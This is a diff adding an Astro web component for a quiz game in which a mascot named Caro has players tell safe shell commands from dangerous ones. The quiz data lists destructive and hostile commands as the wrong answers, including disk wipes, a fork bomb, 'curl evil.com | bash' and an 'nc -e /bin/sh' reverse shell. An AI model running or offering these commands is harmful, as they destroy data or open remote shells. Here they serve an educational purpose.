@@ -1,0 +1,811 @@
+---
+// CaroGame.astro - "Who Wants to Be Safe?" quiz game featuring Caro
+---
+
+<section id="game" class="game-section">
+  <div class="container">
+    <h2>Play with Caro</h2>
+    <p class="section-subtitle">
+      Test your shell command knowledge! Pick the safe commands, avoid the dangerous ones.
+    </p>
+
+    <div class="game-wrapper">
+      <div class="quiz-cabinet">
+        <!-- Header -->
+        <div class="quiz-header">
+          <div class="stat">
+            <span class="stat-label">LEVEL</span>
+            <span id="level" class="stat-value">1</span>
+          </div>
+          <div class="title">SAFE OR DANGER?</div>
+          <div class="stat">
+            <span class="stat-label">SCORE</span>
+            <span id="score" class="stat-value">0</span>
+          </div>
+        </div>
+
+        <!-- Progress bar -->
+        <div class="progress-bar">
+          <div id="timer-bar" class="timer-fill"></div>
+        </div>
+
+        <!-- Game area -->
+        <div id="game-area" class="game-area">
+          <!-- Caro in center -->
+          <div class="caro-center">
+            <img src="/caro-pixel.png" alt="Caro" />
+            <div id="caro-speech" class="speech-bubble">Pick the SAFE command!</div>
+          </div>
+
+          <!-- Command options grid -->
+          <div id="options-grid" class="options-grid">
+            <!-- Options will be inserted here -->
+          </div>
+
+          <!-- Overlay -->
+          <div id="overlay" class="overlay">
+            <div class="overlay-box">
+              <div id="overlay-title" class="overlay-title">SAFE OR DANGER?</div>
+              <div id="overlay-subtitle" class="overlay-subtitle">
+                Can you identify which shell commands are safe to run?
+              </div>
+              <div class="rules">
+                <div class="rule safe">✓ Pick SAFE commands to score points</div>
+                <div class="rule danger">✗ Avoid DANGEROUS commands or lose a life</div>
+                <div class="rule timer">⏱ Answer before time runs out!</div>
+              </div>
+              <div class="lives-display">
+                <span>Lives:</span>
+                <span id="lives-display">❤️ ❤️ ❤️</span>
+              </div>
+              <button id="start-btn" class="start-btn">START GAME</button>
+              <div id="high-score-display" class="high-score">High Score: <span id="high-score">0</span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Lives indicator -->
+        <div class="footer-bar">
+          <div id="lives" class="lives">
+            <span class="heart">❤️</span>
+            <span class="heart">❤️</span>
+            <span class="heart">❤️</span>
+          </div>
+          <div id="streak" class="streak">🔥 Streak: <span id="streak-count">0</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<style is:global>
+  .game-section {
+    background: var(--color-bg-secondary);
+    padding: 80px 20px;
+  }
+
+  .game-wrapper {
+    display: flex;
+    justify-content: center;
+  }
+
+  .quiz-cabinet {
+    background: linear-gradient(180deg, #1a1a2e 0%, #0f0f1a 100%);
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 0 0 4px #ff8c42, 0 0 40px rgba(255, 140, 66, 0.3);
+    max-width: 800px;
+    width: 100%;
+  }
+
+  .quiz-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 20px;
+    margin-bottom: 10px;
+  }
+
+  .stat {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: 'Courier New', monospace;
+  }
+
+  .stat-label {
+    font-size: 11px;
+    color: #ff8c42;
+    letter-spacing: 2px;
+  }
+
+  .stat-value {
+    font-size: 28px;
+    color: #fff;
+    font-weight: bold;
+    text-shadow: 0 0 10px rgba(255, 140, 66, 0.8);
+  }
+
+  .title {
+    font-size: 22px;
+    font-weight: bold;
+    color: #ff8c42;
+    text-shadow: 0 0 15px rgba(255, 140, 66, 0.8);
+    letter-spacing: 3px;
+    font-family: 'Courier New', monospace;
+  }
+
+  .progress-bar {
+    height: 8px;
+    background: #222;
+    border-radius: 4px;
+    margin: 0 10px 15px;
+    overflow: hidden;
+  }
+
+  .timer-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #2ecc71 0%, #f1c40f 50%, #e74c3c 100%);
+    width: 100%;
+    transition: width 0.1s linear;
+    border-radius: 4px;
+  }
+
+  .timer-fill.warning {
+    animation: pulse-warning 0.5s ease-in-out infinite;
+  }
+
+  @keyframes pulse-warning {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.6; }
+  }
+
+  .game-area {
+    position: relative;
+    min-height: 450px;
+    background: radial-gradient(ellipse at center, #12121a 0%, #0a0a0f 100%);
+    border-radius: 12px;
+    padding: 30px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .caro-center {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 30px;
+    z-index: 10;
+  }
+
+  .caro-center img {
+    width: 80px;
+    height: 80px;
+    image-rendering: pixelated;
+    filter: drop-shadow(0 0 20px rgba(255, 140, 66, 0.6));
+    animation: float 2s ease-in-out infinite;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+
+  .caro-center.correct img {
+    animation: celebrate 0.5s ease-out;
+    filter: drop-shadow(0 0 30px #2ecc71);
+  }
+
+  .caro-center.wrong img {
+    animation: shake 0.5s ease-out;
+    filter: drop-shadow(0 0 30px #e74c3c);
+  }
+
+  @keyframes celebrate {
+    0%, 100% { transform: scale(1) rotate(0); }
+    25% { transform: scale(1.2) rotate(-5deg); }
+    75% { transform: scale(1.2) rotate(5deg); }
+  }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20%, 60% { transform: translateX(-10px); }
+    40%, 80% { transform: translateX(10px); }
+  }
+
+  .speech-bubble {
+    background: #fff;
+    color: #333;
+    padding: 10px 18px;
+    border-radius: 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    margin-top: 10px;
+    position: relative;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+  }
+
+  .speech-bubble::before {
+    content: '';
+    position: absolute;
+    top: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    border: 8px solid transparent;
+    border-bottom-color: #fff;
+    border-top: 0;
+  }
+
+  .speech-bubble.correct {
+    background: #2ecc71;
+    color: #fff;
+  }
+
+  .speech-bubble.wrong {
+    background: #e74c3c;
+    color: #fff;
+  }
+
+  .speech-bubble.correct::before { border-bottom-color: #2ecc71; }
+  .speech-bubble.wrong::before { border-bottom-color: #e74c3c; }
+
+  .options-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    width: 100%;
+    max-width: 600px;
+  }
+
+  .option-btn {
+    background: linear-gradient(180deg, #252535 0%, #1a1a28 100%);
+    border: 3px solid #444;
+    border-radius: 12px;
+    padding: 16px 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    color: #ddd;
+    cursor: pointer;
+    transition: all 0.15s ease;
+    text-align: left;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 14px;
+  }
+
+  .option-btn:hover:not(:disabled) {
+    border-color: #ff8c42;
+    background: linear-gradient(180deg, #2a2a3a 0%, #1f1f2d 100%);
+    transform: translateY(-2px);
+    box-shadow: 0 5px 20px rgba(255, 140, 66, 0.3);
+  }
+
+  .option-btn:disabled {
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+
+  .option-btn.safe-reveal {
+    border-color: #2ecc71;
+    background: linear-gradient(180deg, #1a3a2a 0%, #0f2a1a 100%);
+    color: #2ecc71;
+  }
+
+  .option-btn.danger-reveal {
+    border-color: #e74c3c;
+    background: linear-gradient(180deg, #3a1a1a 0%, #2a0f0f 100%);
+    color: #e74c3c;
+  }
+
+  .option-btn.selected-correct {
+    border-color: #2ecc71;
+    background: #2ecc71;
+    color: #fff;
+    animation: pop 0.3s ease-out;
+  }
+
+  .option-btn.selected-wrong {
+    border-color: #e74c3c;
+    background: #e74c3c;
+    color: #fff;
+    animation: shake 0.3s ease-out;
+  }
+
+  @keyframes pop {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+  }
+
+  .option-label {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 32px;
+    height: 32px;
+    background: linear-gradient(180deg, #ff8c42 0%, #e67635 100%);
+    color: #fff;
+    font-size: 14px;
+    font-weight: bold;
+    border-radius: 8px;
+    flex-shrink: 0;
+  }
+
+  .option-cmd {
+    flex: 1;
+  }
+
+  .option-cmd::before {
+    content: '$ ';
+    color: #666;
+  }
+
+  /* Overlay */
+  .overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.95);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 100;
+    border-radius: 12px;
+  }
+
+  .overlay.hidden { display: none; }
+
+  .overlay-box {
+    text-align: center;
+    padding: 30px;
+    font-family: 'Courier New', monospace;
+  }
+
+  .overlay-title {
+    font-size: 32px;
+    color: #ff8c42;
+    margin-bottom: 10px;
+    text-shadow: 0 0 20px rgba(255, 140, 66, 0.8);
+    letter-spacing: 2px;
+  }
+
+  .overlay-subtitle {
+    color: #aaa;
+    margin-bottom: 25px;
+    font-size: 14px;
+  }
+
+  .rules {
+    margin-bottom: 25px;
+    text-align: left;
+    display: inline-block;
+  }
+
+  .rule {
+    padding: 8px 15px;
+    margin: 5px 0;
+    border-radius: 6px;
+    font-size: 13px;
+  }
+
+  .rule.safe {
+    background: rgba(46, 204, 113, 0.2);
+    color: #2ecc71;
+    border-left: 3px solid #2ecc71;
+  }
+
+  .rule.danger {
+    background: rgba(231, 76, 60, 0.2);
+    color: #e74c3c;
+    border-left: 3px solid #e74c3c;
+  }
+
+  .rule.timer {
+    background: rgba(241, 196, 15, 0.2);
+    color: #f1c40f;
+    border-left: 3px solid #f1c40f;
+  }
+
+  .lives-display {
+    margin-bottom: 20px;
+    font-size: 18px;
+    color: #fff;
+  }
+
+  .start-btn {
+    background: linear-gradient(180deg, #ff8c42 0%, #e67635 100%);
+    border: none;
+    color: #fff;
+    font-family: 'Courier New', monospace;
+    font-size: 20px;
+    font-weight: bold;
+    padding: 16px 50px;
+    border-radius: 10px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    box-shadow: 0 4px 0 #b35c20, 0 0 25px rgba(255, 140, 66, 0.4);
+    transition: all 0.1s;
+  }
+
+  .start-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 0 #b35c20, 0 0 35px rgba(255, 140, 66, 0.6);
+  }
+
+  .start-btn:active {
+    transform: translateY(2px);
+    box-shadow: 0 2px 0 #b35c20;
+  }
+
+  .high-score {
+    margin-top: 20px;
+    color: #666;
+    font-size: 14px;
+  }
+
+  .footer-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    margin-top: 10px;
+  }
+
+  .lives {
+    display: flex;
+    gap: 8px;
+    font-size: 24px;
+  }
+
+  .lives .heart {
+    transition: all 0.3s;
+  }
+
+  .lives .heart.lost {
+    filter: grayscale(1);
+    opacity: 0.3;
+    transform: scale(0.8);
+  }
+
+  .streak {
+    font-family: 'Courier New', monospace;
+    font-size: 16px;
+    color: #f1c40f;
+  }
+
+  @media (max-width: 600px) {
+    .options-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .game-area {
+      min-height: 500px;
+      padding: 20px;
+    }
+
+    .option-btn {
+      font-size: 13px;
+      padding: 14px 16px;
+    }
+
+    .title {
+      font-size: 16px;
+      letter-spacing: 1px;
+    }
+
+    .overlay-title {
+      font-size: 24px;
+    }
+  }
+</style>
+
+<script>
+  (function() {
+    // Elements
+    const gameArea = document.getElementById('game-area');
+    const optionsGrid = document.getElementById('options-grid');
+    const overlay = document.getElementById('overlay');
+    const overlayTitle = document.getElementById('overlay-title');
+    const overlaySubtitle = document.getElementById('overlay-subtitle');
+    const startBtn = document.getElementById('start-btn');
+    const levelEl = document.getElementById('level');
+    const scoreEl = document.getElementById('score');
+    const highScoreEl = document.getElementById('high-score');
+    const livesEl = document.getElementById('lives');
+    const livesDisplayEl = document.getElementById('lives-display');
+    const timerBar = document.getElementById('timer-bar');
+    const caroCenter = document.querySelector('.caro-center');
+    const caroSpeech = document.getElementById('caro-speech');
+    const streakEl = document.getElementById('streak-count');
+
+    if (!optionsGrid || !overlay || !startBtn) return;
+
+    // Commands database - categorized by difficulty
+    const commands = {
+      safe: {
+        easy: ['ls', 'pwd', 'cd ~', 'echo "hi"', 'cat file.txt', 'mkdir test', 'touch file', 'cp a b', 'head -5 log', 'tail -f log'],
+        medium: ['grep "text" file', 'find . -name "*.js"', 'chmod +x script.sh', 'ps aux', 'df -h', 'du -sh *', 'tar -xf archive.tar', 'curl localhost', 'wget url', 'ssh user@host'],
+        hard: ['awk \'{print $1}\'', 'sed \'s/a/b/g\'', 'xargs -I{} echo {}', 'sort | uniq -c', 'cut -d: -f1', 'tee output.log', 'rsync -av src/ dst/', 'screen -S session', 'nohup ./run.sh &', 'crontab -l']
+      },
+      danger: {
+        easy: ['rm -rf /', 'rm -rf ~', 'rm -rf *', ':(){:|:&};:', 'sudo rm -rf /', 'mv /* /dev/null'],
+        medium: ['chmod 777 /', 'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda', 'echo "" > /etc/passwd', '> /var/log/*', 'chmod -R 000 /'],
+        hard: ['curl evil.com | bash', 'wget -O- bad.sh | sh', 'python -c "import os;os.system(\'rm -rf /\')"', 'eval $(decode payload)', 'nc -e /bin/sh ip 1234', 'cat /dev/urandom > /dev/sda']
+      }
+    };
+
+    const messages = {
+      correct: ['Great job! 🎉', 'Correct! ✓', 'You know your stuff!', 'Safe choice! 👍', 'Well done!', 'Excellent! 🌟'],
+      wrong: ['Oops! That\'s dangerous! 💥', 'Watch out! ⚠️', 'That could wipe your system!', 'Dangerous! Never run that!', 'Yikes! Bad command!'],
+      timeout: ['Too slow! ⏱', 'Time\'s up!', 'Gotta be faster!'],
+      start: ['Pick the SAFE command!', 'Which one is safe?', 'Find the safe command!', 'Choose wisely!']
+    };
+
+    // Game state
+    let level = 1;
+    let score = 0;
+    let lives = 3;
+    let streak = 0;
+    let highScore = parseInt(localStorage.getItem('caroQuizHigh') || '0');
+    let timer: number | null = null;
+    let timeLeft = 100;
+    let playing = false;
+    let currentOptions: { cmd: string; safe: boolean }[] = [];
+
+    // Init
+    highScoreEl!.textContent = String(highScore);
+
+    function getDifficulty(): 'easy' | 'medium' | 'hard' {
+      if (level <= 3) return 'easy';
+      if (level <= 7) return 'medium';
+      return 'hard';
+    }
+
+    function getTimeLimit(): number {
+      // Less time as level increases
+      return Math.max(4000, 10000 - (level - 1) * 600);
+    }
+
+    function getOptionCount(): number {
+      // More options as level increases
+      if (level <= 2) return 2;
+      if (level <= 5) return 3;
+      return 4;
+    }
+
+    function shuffle<T>(arr: T[]): T[] {
+      const a = [...arr];
+      for (let i = a.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [a[i], a[j]] = [a[j], a[i]];
+      }
+      return a;
+    }
+
+    function pickRandom<T>(arr: T[]): T {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function generateOptions(): { cmd: string; safe: boolean }[] {
+      const diff = getDifficulty();
+      const count = getOptionCount();
+
+      // Always have exactly 1 safe command
+      const safeCmd = pickRandom(commands.safe[diff]);
+
+      // Fill rest with danger commands
+      const dangerCmds = shuffle(commands.danger[diff]).slice(0, count - 1);
+
+      const options = [
+        { cmd: safeCmd, safe: true },
+        ...dangerCmds.map(cmd => ({ cmd, safe: false }))
+      ];
+
+      return shuffle(options);
+    }
+
+    function updateLives() {
+      const hearts = livesEl!.querySelectorAll('.heart');
+      hearts.forEach((h, i) => h.classList.toggle('lost', i >= lives));
+      livesDisplayEl!.textContent = '❤️ '.repeat(lives).trim() || '💔';
+    }
+
+    function showQuestion() {
+      currentOptions = generateOptions();
+      optionsGrid!.innerHTML = '';
+
+      const labels = ['A', 'B', 'C', 'D'];
+
+      currentOptions.forEach((opt, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'option-btn';
+        btn.innerHTML = `<span class="option-cmd">${opt.cmd}</span><span class="option-label">${labels[i]}</span>`;
+        btn.addEventListener('click', () => handleAnswer(i, btn));
+        optionsGrid!.appendChild(btn);
+      });
+
+      // Reset Caro
+      caroCenter!.classList.remove('correct', 'wrong');
+      caroSpeech!.classList.remove('correct', 'wrong');
+      caroSpeech!.textContent = pickRandom(messages.start);
+
+      // Start timer
+      timeLeft = 100;
+      timerBar!.style.width = '100%';
+      timerBar!.classList.remove('warning');
+
+      const timeLimit = getTimeLimit();
+      const interval = 50;
+      const decrement = 100 / (timeLimit / interval);
+
+      timer = window.setInterval(() => {
+        timeLeft -= decrement;
+        timerBar!.style.width = Math.max(0, timeLeft) + '%';
+
+        if (timeLeft <= 30) {
+          timerBar!.classList.add('warning');
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timer!);
+          handleTimeout();
+        }
+      }, interval);
+    }
+
+    function handleAnswer(index: number, btn: HTMLButtonElement) {
+      if (!playing) return;
+
+      clearInterval(timer!);
+
+      const selected = currentOptions[index];
+      const buttons = optionsGrid!.querySelectorAll('.option-btn');
+
+      // Disable all buttons
+      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);
+
+      // Reveal all answers
+      currentOptions.forEach((opt, i) => {
+        const b = buttons[i];
+        if (opt.safe) {
+          b.classList.add('safe-reveal');
+        } else {
+          b.classList.add('danger-reveal');
+        }
+      });
+
+      if (selected.safe) {
+        // Correct!
+        btn.classList.add('selected-correct');
+        caroCenter!.classList.add('correct');
+        caroSpeech!.classList.add('correct');
+        caroSpeech!.textContent = pickRandom(messages.correct);
+
+        // Score based on time and level
+        const timeBonus = Math.floor(timeLeft / 10);
+        const levelBonus = level * 5;
+        const points = 10 + timeBonus + levelBonus;
+        score += points;
+        streak++;
+
+        scoreEl!.textContent = String(score);
+        streakEl!.textContent = String(streak);
+
+        setTimeout(() => {
+          level++;
+          levelEl!.textContent = String(level);
+          showQuestion();
+        }, 1500);
+      } else {
+        // Wrong!
+        btn.classList.add('selected-wrong');
+        caroCenter!.classList.add('wrong');
+        caroSpeech!.classList.add('wrong');
+        caroSpeech!.textContent = pickRandom(messages.wrong);
+
+        lives--;
+        streak = 0;
+        streakEl!.textContent = '0';
+        updateLives();
+
+        if (lives <= 0) {
+          setTimeout(endGame, 1500);
+        } else {
+          setTimeout(showQuestion, 2000);
+        }
+      }
+    }
+
+    function handleTimeout() {
+      if (!playing) return;
+
+      const buttons = optionsGrid!.querySelectorAll('.option-btn');
+      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);
+
+      // Reveal answers
+      currentOptions.forEach((opt, i) => {
+        const b = buttons[i];
+        if (opt.safe) {
+          b.classList.add('safe-reveal');
+        } else {
+          b.classList.add('danger-reveal');
+        }
+      });
+
+      caroCenter!.classList.add('wrong');
+      caroSpeech!.classList.add('wrong');
+      caroSpeech!.textContent = pickRandom(messages.timeout);
+
+      lives--;
+      streak = 0;
+      streakEl!.textContent = '0';
+      updateLives();
+
+      if (lives <= 0) {
+        setTimeout(endGame, 1500);
+      } else {
+        setTimeout(showQuestion, 2000);
+      }
+    }
+
+    function startGame() {
+      playing = true;
+      level = 1;
+      score = 0;
+      lives = 3;
+      streak = 0;
+
+      levelEl!.textContent = '1';
+      scoreEl!.textContent = '0';
+      streakEl!.textContent = '0';
+      updateLives();
+
+      overlay!.classList.add('hidden');
+      showQuestion();
+    }
+
+    function endGame() {
+      playing = false;
+      clearInterval(timer!);
+
+      if (score > highScore) {
+        highScore = score;
+        localStorage.setItem('caroQuizHigh', String(highScore));
+        highScoreEl!.textContent = String(highScore);
+        overlayTitle!.textContent = '🎉 NEW HIGH SCORE!';
+      } else {
+        overlayTitle!.textContent = 'GAME OVER';
+      }
+
+      overlaySubtitle!.textContent = `You reached Level ${level} with ${score} points!`;
+      startBtn!.textContent = 'PLAY AGAIN';
+      overlay!.classList.remove('hidden');
+    }
+
+    // Keyboard support
+    document.addEventListener('keydown', (e) => {
+      if (!playing) {
+        if (e.key === ' ' || e.key === 'Enter') {
+          e.preventDefault();
+          startGame();
+        }
+        return;
+      }
+
+      const key = e.key.toLowerCase();
+      const index = { 'a': 0, 'b': 1, 'c': 2, 'd': 3, '1': 0, '2': 1, '3': 2, '4': 3 }[key];
+
+      if (index !== undefined && index < currentOptions.length) {
+        const btn = optionsGrid!.querySelectorAll('.option-btn')[index] as HTMLButtonElement;
+        if (btn && !btn.disabled) {
+          btn.click();
+        }
+      }
+    });
+
+    startBtn!.addEventListener('click', startGame);
+  })();
+</script>
